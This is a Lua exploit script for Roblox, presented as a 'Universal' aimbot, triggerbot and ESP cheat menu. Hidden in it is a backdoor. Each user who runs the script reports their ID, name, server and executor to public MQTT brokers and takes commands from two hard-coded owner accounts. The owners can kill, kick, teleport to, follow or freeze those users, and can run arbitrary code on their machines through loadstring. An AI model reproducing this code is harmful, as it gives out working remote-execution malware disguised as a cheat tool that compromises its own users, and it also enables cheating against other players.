--[[
    [S] Universal Control + Aimbot v3
    Owners: 1460823186, 7208967899
    Transport: MQTT over WebSocket (HiveMQ public broker, no signup, no rate limit)
--]]

local OWNERS = { [1460823186] = true, [7208967899] = true }

local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local HttpService  = game:GetService("HttpService")
local TeleportSvc  = game:GetService("TeleportService")
local CoreGui      = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Camera       = workspace.CurrentCamera

local LP    = Players.LocalPlayer
local MY_ID = LP.UserId
local IS_OWNER = OWNERS[MY_ID] == true

local SESSION_KEY  = "freddy_private_2026"
local TOPIC_BASE   = "FreddyKv/" .. SESSION_KEY .. "/"
local TOPIC_ONLINE = TOPIC_BASE .. "online"
local TOPIC_CMD    = TOPIC_BASE .. "cmd/"

-- ============================================================
-- MQTT 3.1.1 client over WebSocket (minimal, QoS 0)
-- ============================================================
local MQTT = {}
MQTT.__index = MQTT

local function encLen(n)
    local out = {}
    repeat
        local d = n % 128
        n = math.floor(n / 128)
        if n > 0 then d = d + 128 end
        table.insert(out, string.char(d))
    until n == 0
    return table.concat(out)
end

local function encStr(s)
    return string.char(#s // 256, #s % 256) .. s
end

local function decLen(buf, i)
    local mul, val = 1, 0
    repeat
        local b = buf:byte(i); i = i + 1
        val = val + (b % 128) * mul
        mul = mul * 128
    until b < 128
    return val, i
end

function MQTT.new(host, port, path, clientId, onMessage, onConnect)
    local self = setmetatable({}, MQTT)
    self.onMessage = onMessage
    self.onConnect = onConnect
    self.pendingSubs = {}
    self.pid = 0
    self.dead = false
    self.connected = false

    local url = "wss://" .. host .. ":" .. port .. path
    local ws
    local ok, err = pcall(function()
        if syn and syn.websocket then
            ws = syn.websocket.connect(url)
        elseif WebSocket and WebSocket.connect then
            ws = WebSocket.connect(url)
        else
            error("no websocket support")
        end
    end)
    if not ok or not ws then error("ws connect failed: " .. tostring(err)) end

    self.ws = ws

    ws.OnMessage = function(_, data)
        if type(data) == "table" then
            data = data.data or data[1] or ""
        end
        if type(data) == "string" and #data > 0 then
            pcall(function() self:_handle(data) end)
        end
    end
    ws.OnClose = function() self.dead = true end

    -- CONNECT: protocol "MQTT", level 4, flags 0x02 (clean session), keepalive 60
    local vh = encStr("MQTT") .. string.char(4, 0x02, 0, 60)
    local payload = encStr(clientId or ("FreddyKv_" .. tostring(math.random(1, 999999999))))
    local pkt = string.char(0x10) .. encLen(#vh + #payload) .. vh .. payload
    self:_send(pkt)

    return self
end

function MQTT:_send(p)
    if not self.ws then return end
    pcall(function()
        if syn and syn.websocket then
            self.ws:Send(p)
        else
            self.ws:Send(p)
        end
    end)
end

function MQTT:subscribe(topic)
    if not self.connected then
        table.insert(self.pendingSubs, topic)
        return
    end
    self.pid = self.pid + 1
    local payload = string.char(self.pid // 256, self.pid % 256) .. encStr(topic) .. string.char(0)
    local pkt = string.char(0x82) .. encLen(#payload) .. payload
    self:_send(pkt)
end

function MQTT:publish(topic, msg)
    if type(msg) ~= "string" then msg = tostring(msg) end
    local payload = encStr(topic) .. msg
    local pkt = string.char(0x30) .. encLen(#payload) .. payload
    self:_send(pkt)
end

function MQTT:_handle(data)
    if type(data) ~= "string" or #data < 2 then return end
    local typeId = data:byte(1) // 16
    local _, i = decLen(data, 2)

    if typeId == 2 then -- CONNACK
        if data:byte(i + 1) == 0 then
            self.connected = true
            for _, t in ipairs(self.pendingSubs) do self:subscribe(t) end
            self.pendingSubs = {}
            if self.onConnect then pcall(self.onConnect) end
        end
    elseif typeId == 3 then -- PUBLISH
        local tlen = data:byte(i) * 256 + data:byte(i + 1); i = i + 2
        local topic = data:sub(i, i + tlen - 1); i = i + tlen
        -- QoS 0: no packet id
        local payload = data:sub(i)
        if self.onMessage then pcall(self.onMessage, topic, payload) end
    end
end

-- ============================================================
-- Connection state
-- ============================================================
local CLIENT = nil
local CONNECTED = false
local CONNECT_ERR = ""

local function onMqttMessage(topic, payload)
    local ok, data = pcall(HttpService.JSONDecode, HttpService, payload)
    if not ok or type(data) ~= "table" then return end
    if topic == TOPIC_ONLINE then
        if OwnerOnHeartbeat then OwnerOnHeartbeat(data) end
    elseif topic:sub(1, #TOPIC_CMD) == TOPIC_CMD then
        if TargetOnCommand then TargetOnCommand(data) end
    end
end

-- forward decls
OwnerOnHeartbeat = nil
TargetOnCommand  = nil

task.spawn(function()
    local attempts = {
        { "broker.hivemq.com", 8884, "/mqtt" },
        { "broker.emqx.io",    8084, "/mqtt" },
        { "test.mosquitto.org", 8081, "/mqtt" },
    }
    for _, cfg in ipairs(attempts) do
        local host, port, path = cfg[1], cfg[2], cfg[3]
        local ok, err = pcall(function()
            CLIENT = MQTT.new(host, port, path, nil, onMqttMessage, function()
                CONNECTED = true
                CONNECT_ERR = ""
            end)
        end)
        if ok and CLIENT then
            -- give it a moment to actually CONNACK
            local t0 = tick()
            while tick() - t0 < 3 and not CONNECTED and not CLIENT.dead do
                task.wait(0.1)
            end
            if CONNECTED then break end
            pcall(function() CLIENT.ws:Close() end)
            CLIENT = nil
        else
            CONNECT_ERR = tostring(err)
        end
    end
    if not CONNECTED and not CONNECT_ERR:find("CONNECT") then
        CONNECT_ERR = "all brokers failed"
    end
end)

-- ============================================================
-- UI helpers, purple glow, click feedback, drag
-- ============================================================
local function makeGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    g.IgnoreGuiInset = true
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function pulseStroke(stroke)
    task.spawn(function()
        local a = Color3.fromRGB(130, 60, 210)
        local b = Color3.fromRGB(210, 110, 255)
        while stroke and stroke.Parent do
            local t1 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = b })
            t1:Play(); t1.Completed:Wait()
            if not stroke.Parent then break end
            local t2 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = a })
            t2:Play(); t2.Completed:Wait()
        end
    end)
end

local function styleFrame(frame)
    frame.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
    frame.BorderSizePixel = 0
    frame.Active = true
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 10); corner.Parent = frame
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(130, 60, 210)
    stroke.Thickness = 1.6
    stroke.Parent = frame
    pulseStroke(stroke)
    return stroke
end

local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(42, 24, 66)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(235, 220, 255)
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.AutoButtonColor = false
    btn.Active = true
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 6); corner.Parent = btn
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(160, 90, 240)
    stroke.Thickness = 1
    stroke.Transparency = 0.2
    stroke.Parent = btn
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new(Color3.fromRGB(70, 40, 105), Color3.fromRGB(34, 18, 54))
    grad.Rotation = 90
    grad.Parent = btn

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(62, 38, 95) }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
    end)
    btn.MouseButton1Down:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(110, 60, 170) }):Play()
    end)
    btn.MouseButton1Up:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
    end)
    return stroke
end

local function makeBtn(parent, text, x, y, w, h, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, w, 0, h)
    b.Position = UDim2.new(0, x, 0, y)
    b.Text = text
    b.Parent = parent
    styleButton(b)
    b.MouseButton1Click:Connect(cb)
    return b
end

local function makeLabel(parent, text, x, y, w, h, sz, color)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0, w, 0, h)
    l.Position = UDim2.new(0, x, 0, y)
    l.BackgroundTransparency = 1
    l.TextColor3 = color or Color3.fromRGB(225, 210, 245)
    l.Font = Enum.Font.Gotham
    l.TextSize = sz or 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = text
    l.Parent = parent
    return l
end

local function makeInput(parent, placeholder, x, y, w, h)
    local t = Instance.new("TextBox")
    t.Size = UDim2.new(0, w, 0, h)
    t.Position = UDim2.new(0, x, 0, y)
    t.BackgroundColor3 = Color3.fromRGB(26, 16, 42)
    t.BorderSizePixel = 0
    t.TextColor3 = Color3.fromRGB(235, 220, 255)
    t.PlaceholderColor3 = Color3.fromRGB(150, 120, 195)
    t.Font = Enum.Font.Gotham
    t.TextSize = 12
    t.PlaceholderText = placeholder
    t.Text = ""
    t.ClearTextOnFocus = false
    t.Active = true
    t.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(140, 70, 220); s.Transparency = 0.35; s.Parent = t
    return t
end

local function makeScrolling(parent, x, y, w, h)
    local s = Instance.new("ScrollingFrame")
    s.Size = UDim2.new(0, w, 0, h)
    s.Position = UDim2.new(0, x, 0, y)
    s.BackgroundTransparency = 1
    s.BorderSizePixel = 0
    s.ScrollBarThickness = 4
    s.ScrollBarImageColor3 = Color3.fromRGB(160, 90, 240)
    s.CanvasSize = UDim2.new(0, 0, 0, 0)
    s.Active = true
    s.Parent = parent
    local l = Instance.new("UIListLayout")
    l.Padding = UDim.new(0, 6)
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Parent = s
    return s, l
end

local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, dragStart, startPos
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ============================================================
-- Action executor
-- ============================================================
local function executeAction(c)
    local char = LP.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")

    if c.action == "freeze" and hrp then hrp.Anchored = true end
    if c.action == "unfreeze" and hrp then hrp.Anchored = false end
    if c.action == "fling" and hrp then hrp.AssemblyLinearVelocity = Vector3.new(1e5, 1e5, 1e5) end
    if c.action == "explode" and hrp then
        local e = Instance.new("Explosion"); e.Position = hrp.Position; e.Parent = workspace
    end
    if c.action == "kill" and hum then hum.Health = 0 end
    if c.action == "reset" and hum then hum.Health = 0 end
    if c.action == "ragdoll" and char then
        for _, j in ipairs(char:GetDescendants()) do
            if j:IsA("Motor6D") then j.Enabled = false end
        end
    end
    if c.action == "bring" and hrp then
        local owner = Players:GetPlayerByUserId(c.from)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
    end
    if c.action == "sound" then
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. tostring(c.payload)
        s.Parent = workspace
        s:Play()
        task.delay(6, function() s:Destroy() end)
    end
    if c.action == "message" then
        local g2 = makeGui("[S] msg")
        local box = Instance.new("TextLabel")
        box.Size = UDim2.new(0, 340, 0, 64)
        box.Position = UDim2.new(0.5, -170, 0.12, 0)
        box.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
        box.BorderSizePixel = 0
        box.TextColor3 = Color3.fromRGB(235, 220, 255)
        box.Font = Enum.Font.GothamBold
        box.TextSize = 15
        box.TextWrapped = true
        box.Text = tostring(c.payload or "")
        box.Parent = g2
        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = box
        local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(180, 90, 240); ss.Parent = box
        task.delay(4, function() g2:Destroy() end)
    end
    if c.action == "kick" then
        pcall(function() LP:Kick(tostring(c.payload ~= "" and c.payload or "Kicked.")) end)
    end
    if c.action == "code" then
        local fn = loadstring or load
        if fn then pcall(function() fn(c.payload)() end) end
    end
end

function TargetOnCommand(data)
    executeAction(data)
end

-- ============================================================
-- Heartbeat + subscribe
-- ============================================================
task.spawn(function()
    -- wait for connection
    while not CONNECTED and not CONNECT_ERR do task.wait(0.1) end
    if not CONNECTED then return end

    if CLIENT then
        CLIENT:subscribe(TOPIC_CMD .. tostring(MY_ID))
        CLIENT:subscribe(TOPIC_ONLINE)
    end

    while true do
        if CLIENT and CONNECTED then
            pcall(function()
                CLIENT:publish(TOPIC_ONLINE, HttpService:JSONEncode({
                    uid = MY_ID, name = LP.Name,
                    job = game.JobId, place = game.PlaceId,
                    ts = os.time(),
                    exec = (identifyexecutor and identifyexecutor()) or "unknown",
                }))
            end)
        end
        task.wait(5)
    end
end)

-- ============================================================
-- OWNER PANEL
-- ============================================================
if IS_OWNER then
    local ONLINE      = {}
    local HISTORY     = {}
    local FILTER      = { exec = "", place = "" }
    local FOLLOWING   = {}
    local LAST_HB     = 0

    function OwnerOnHeartbeat(data)
        if data and data.uid then
            ONLINE[tostring(data.uid)] = data
            LAST_HB = os.time()
        end
    end

    local gui = makeGui("[S] Control")
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 340, 0, 540)
    frame.Position = UDim2.new(0, 20, 0.15, 0)
    styleFrame(frame)
    frame.Parent = gui

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = frame
    makeDraggable(frame, header)

    makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
    local statusLbl = makeLabel(header, "transport: ...", 190, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
    statusLbl.TextXAlignment = Enum.TextXAlignment.Right

    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 280, 14)

    local execFilter = makeInput(frame, "filter executor...", 14, 52, 150, 22)
    local placeFilter = makeInput(frame, "filter place id...", 170, 52, 150, 22)
    execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
    placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)

    local bcast = makeInput(frame, "broadcast message...", 14, 80, 220, 24)
    makeBtn(frame, "Send All",   240, 80, 80, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "message", payload = bcast.Text }))
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
    end)
    makeBtn(frame, "Freeze All", 14, 110, 150, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "freeze" }))
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> freeze all")
    end)
    makeBtn(frame, "Unfreeze All", 170, 110, 150, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "unfreeze" }))
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> unfreeze all")
    end)

    makeLabel(frame, "LIVE PLAYERS", 14, 142, 200, 14)

    local scroll, layout = makeScrolling(frame, 14, 160, 312, 300)

    makeLabel(frame, "HISTORY", 14, 468, 100, 14)
    local histLog = Instance.new("TextLabel")
    histLog.Size = UDim2.new(0, 312, 0, 50)
    histLog.Position = UDim2.new(0, 14, 0, 484)
    histLog.BackgroundColor3 = Color3.fromRGB(14, 8, 24)
    histLog.BorderSizePixel = 0
    histLog.TextColor3 = Color3.fromRGB(190, 170, 220)
    histLog.Font = Enum.Font.Code
    histLog.TextSize = 10
    histLog.TextXAlignment = Enum.TextXAlignment.Left
    histLog.TextYAlignment = Enum.TextYAlignment.Top
    histLog.TextWrapped = true
    histLog.Text = ""
    histLog.Parent = frame
    local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 6); hc.Parent = histLog
    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(130, 60, 210); hs.Transparency = 0.4; hs.Parent = histLog

    local function refreshHistory()
        local out = {}
        for i = 1, math.min(4, #HISTORY) do table.insert(out, HISTORY[i]) end
        histLog.Text = table.concat(out, "\n")
    end

    local SOUND_LIST = {
        ["Bruh"]      = "5238402914",
        ["Vine Boom"] = "6236140145",
        ["Fart"]      = "5476441053",
        ["Airhorn"]   = "2942494796",
        ["Taco Bell"] = "5423143811",
    }

    local function cmd(uid, action, payload)
        if not CLIENT then return end
        CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({
            from = MY_ID, action = action, payload = payload or ""
        }))
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. tostring(action) .. " #" .. tostring(uid))
        refreshHistory()
    end

    local function passesFilter(user)
        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then
            return false
        end
        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then
            return false
        end
        return true
    end

    local function rebuild()
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local now = os.time()
        local count = 0
        for uid, user in pairs(ONLINE) do
            if now - (user.ts or 0) < 30 and passesFilter(user) then
                count = count + 1
                local card = Instance.new("Frame")
                card.Size = UDim2.new(1, -4, 0, 64)
                card.BackgroundColor3 = Color3.fromRGB(28, 18, 44)
                card.BorderSizePixel = 0
                card.Active = true
                card.Parent = scroll
                local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = card
                local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(130, 60, 210); cs.Transparency = 0.4; cs.Parent = card

                local av = Instance.new("Frame")
                av.Size = UDim2.new(0, 44, 0, 44)
                av.Position = UDim2.new(0, 10, 0, 10)
                av.BackgroundColor3 = Color3.fromRGB(48, 28, 72)
                av.BorderSizePixel = 0
                av.Parent = card
                local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = av

                makeLabel(card, tostring(user.name), 64, 6, 200, 16, 13)
                makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
                local ago = math.max(0, now - (user.ts or now))
                makeLabel(card, "hb " .. tostring(ago) .. "s", 64, 40, 120, 12, 10)

                local joinBtn = makeBtn(card, "Join", 240, 8, 64, 22, function()
                    pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
                end)
                joinBtn.Visible = false

                local expandBtn = makeBtn(card, "...", 240, 34, 64, 22, function() end)

                local expanded, panel = false, nil
                expandBtn.MouseButton1Click:Connect(function()
                    targetLbl.Text = "Target: " .. tostring(user.name)
                    if expanded then
                        if panel then panel:Destroy() end
                        expanded = false
                        card.Size = UDim2.new(1, -4, 0, 64)
                        joinBtn.Visible = false
                        return
                    end
                    expanded = true
                    joinBtn.Visible = true
                    panel = Instance.new("Frame")
                    panel.Size = UDim2.new(1, -8, 0, 290)
                    panel.Position = UDim2.new(0, 4, 0, 68)
                    panel.BackgroundTransparency = 1
                    panel.Active = true
                    panel.Parent = card
                    card.Size = UDim2.new(1, -4, 0, 366)

                    local function pb(label, x, y, w, cb)
                        makeBtn(panel, label, x, y, w, 22, cb)
                    end

                    pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
                    pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
                    pb("Freeze",  200, 0, 96, function() cmd(uid, "freeze") end)
                    pb("Unfreeze",0, 26, 96, function() cmd(uid, "unfreeze") end)
                    pb("Explode", 100, 26, 96, function() cmd(uid, "explode") end)
                    pb("Kill",    200, 26, 96, function() cmd(uid, "kill") end)
                    pb("Ragdoll", 0, 52, 96, function() cmd(uid, "ragdoll") end)
                    pb("Reset",   100, 52, 96, function() cmd(uid, "reset") end)
                    pb("Follow",  200, 52, 96, function()
                        FOLLOWING[uid] = not FOLLOWING[uid]
                        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                        refreshHistory()
                    end)

                    local msgIn = makeInput(panel, "message...", 0, 80, 200, 22)
                    pb("Send", 205, 80, 90, function() cmd(uid, "message", msgIn.Text) end)

                    local snd = Instance.new("TextButton")
                    snd.Size = UDim2.new(0, 296, 0, 22)
                    snd.Position = UDim2.new(0, 0, 0, 108)
                    snd.Text = "sound: tap to cycle"
                    snd.Parent = panel
                    styleButton(snd)
                    local soundKeys = {}
                    for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
                    local soundIdx = 1
                    snd.MouseButton1Click:Connect(function()
                        soundIdx = soundIdx % #soundKeys + 1
                        snd.Text = "sound: " .. soundKeys[soundIdx]
                        cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
                    end)

                    local codeIn = makeInput(panel, 'print("hi")', 0, 136, 296, 40)
                    codeIn.Font = Enum.Font.Code
                    pb("Run Code", 0, 180, 296, 22, function() cmd(uid, "code", codeIn.Text) end)

                    makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
                    local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 296, 22)
                    pb("Kick", 0, 250, 296, 22, function() cmd(uid, "kick", kickIn.Text) end)
                end)
            end
        end
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
        if count == 0 then
            local empty = Instance.new("Frame")
            empty.Size = UDim2.new(1, -4, 0, 30)
            empty.BackgroundTransparency = 1
            empty.Parent = scroll
            makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(160, 140, 190))
        end
    end

    refreshHistory()
    rebuild()
    task.spawn(function()
        while task.wait(3) do
            rebuild()
            for uid, on in pairs(FOLLOWING) do
                if on and ONLINE[uid] then
                    local u = ONLINE[uid]
                    if u.job and u.job ~= game.JobId then
                        pcall(function() TeleportSvc:TeleportToPlaceInstance(u.place or game.PlaceId, u.job, LP) end)
                    end
                end
            end
        end
    end)

    task.spawn(function()
        while true do
            local now = os.time()
            if CONNECT_ERR ~= "" then
                statusLbl.Text = "err: " .. CONNECT_ERR:sub(1, 20)
                statusLbl.TextColor3 = Color3.fromRGB(230, 120, 120)
            elseif not CONNECTED then
                statusLbl.Text = "connecting..."
                statusLbl.TextColor3 = Color3.fromRGB(230, 200, 120)
            elseif LAST_HB == 0 then
                statusLbl.Text = "mqtt live, no hb"
                statusLbl.TextColor3 = Color3.fromRGB(180, 180, 230)
            elseif now - LAST_HB < 15 then
                statusLbl.Text = "mqtt live"
                statusLbl.TextColor3 = Color3.fromRGB(140, 230, 140)
            else
                statusLbl.Text = "hb " .. (now - LAST_HB) .. "s ago"
                statusLbl.TextColor3 = Color3.fromRGB(230, 190, 120)
            end
            task.wait(1)
        end
    end)

    return
end

-- ============================================================
-- USER PANEL
-- ============================================================
local gui = makeGui("[S] Universal")
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 260, 0, 460)
main.Position = UDim2.new(0, 20, 0.2, 0)
styleFrame(main)
main.Parent = gui

local uHeader = Instance.new("Frame")
uHeader.Size = UDim2.new(1, 0, 0, 30)
uHeader.BackgroundTransparency = 1
uHeader.Active = true
uHeader.Parent = main
makeDraggable(main, uHeader)

makeLabel(uHeader, "[S] UNIVERSAL", 12, 6, 200, 20, 15)

local CFG = {
    aim = false, fov = 150, smooth = 0.35, bone = "Head",
    team = true, vis = false, trig = false,
    espBox = true, espName = true, espHP = true, espDist = true, espSkel = false, chams = false,
    fovCircle = true,
}

local boneList = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" }
local boneIdx = 1
CFG.bone = boneList[boneIdx]

makeLabel(main, "AIMBOT", 12, 34, 100, 14, 11)
local aimBtn = makeBtn(main, "Aimbot: OFF", 12, 50, 236, 24, function(self)
    CFG.aim = not CFG.aim
    self.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
end)

local fovLbl = makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11)
local fovBar = Instance.new("Frame")
fovBar.Size = UDim2.new(0, 236, 0, 6)
fovBar.Position = UDim2.new(0, 12, 0, 94)
fovBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
fovBar.BorderSizePixel = 0
fovBar.Active = true
fovBar.Parent = main
local fbc = Instance.new("UICorner"); fbc.CornerRadius = UDim.new(1, 0); fbc.Parent = fovBar
local fovFill = Instance.new("Frame")
fovFill.Size = UDim2.new(CFG.fov / 400, 0, 1, 0)
fovFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
fovFill.BorderSizePixel = 0
fovFill.Parent = fovBar
local ffc = Instance.new("UICorner"); ffc.CornerRadius = UDim.new(1, 0); ffc.Parent = fovFill

local fovDrag = false
fovBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if fovDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - fovBar.AbsolutePosition.X) / fovBar.AbsoluteSize.X, 0, 1)
        CFG.fov = math.floor(rel * 400)
        fovFill.Size = UDim2.new(rel, 0, 1, 0)
        fovLbl.Text = "FOV: " .. CFG.fov
    end
end)

local smoothLbl = makeLabel(main, "Smooth: 0.35", 12, 106, 120, 14, 11)
local smoothBar = Instance.new("Frame")
smoothBar.Size = UDim2.new(0, 236, 0, 6)
smoothBar.Position = UDim2.new(0, 12, 0, 122)
smoothBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
smoothBar.BorderSizePixel = 0
smoothBar.Active = true
smoothBar.Parent = main
local sbc = Instance.new("UICorner"); sbc.CornerRadius = UDim.new(1, 0); sbc.Parent = smoothBar
local smoothFill = Instance.new("Frame")
smoothFill.Size = UDim2.new(CFG.smooth, 0, 1, 0)
smoothFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
smoothFill.BorderSizePixel = 0
smoothFill.Parent = smoothBar
local sfc = Instance.new("UICorner"); sfc.CornerRadius = UDim.new(1, 0); sfc.Parent = smoothFill

local smoothDrag = false
smoothBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if smoothDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - smoothBar.AbsolutePosition.X) / smoothBar.AbsoluteSize.X, 0.01, 1)
        CFG.smooth = math.floor(rel * 100) / 100
        smoothFill.Size = UDim2.new(rel, 0, 1, 0)
        smoothLbl.Text = "Smooth: " .. CFG.smooth
    end
end)

makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
    boneIdx = boneIdx % #boneList + 1
    CFG.bone = boneList[boneIdx]
    self.Text = "Bone: " .. CFG.bone
end)

makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self)
    CFG.team = not CFG.team
    self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF")
end)
makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self)
    CFG.vis = not CFG.vis
    self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF")
end)
makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self)
    CFG.trig = not CFG.trig
    self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF")
end)

makeLabel(main, "ESP", 12, 220, 100, 14, 11)
makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
makeBtn(main, "Name: ON",     132, 236, 116, 22, function(self) CFG.espName = not CFG.espName; self.Text = "Name: "  .. (CFG.espName and "ON" or "OFF") end)
makeBtn(main, "Health: ON",   12, 262, 116, 22, function(self) CFG.espHP   = not CFG.espHP;   self.Text = "Health: ".. (CFG.espHP   and "ON" or "OFF") end)
makeBtn(main, "Dist: ON",     132, 262, 116, 22, function(self) CFG.espDist = not CFG.espDist; self.Text = "Dist: "  .. (CFG.espDist and "ON" or "OFF") end)
